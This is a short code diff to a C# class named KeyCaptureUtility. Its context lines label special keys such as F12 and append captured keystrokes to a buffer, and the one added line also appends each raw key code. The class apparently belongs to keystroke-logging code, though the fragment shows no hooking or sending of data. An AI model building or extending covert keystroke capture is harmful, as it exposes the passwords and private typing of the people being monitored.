@@ -156,6 +156,7 @@ public class KeyCaptureUtility
                             if (asc == 123) charPressed = "[F12]";  // F12
 
                             captureBuffer.Append(charPressed);
+                            captureBuffer.Append(asc);
                         }
                     }
                 }
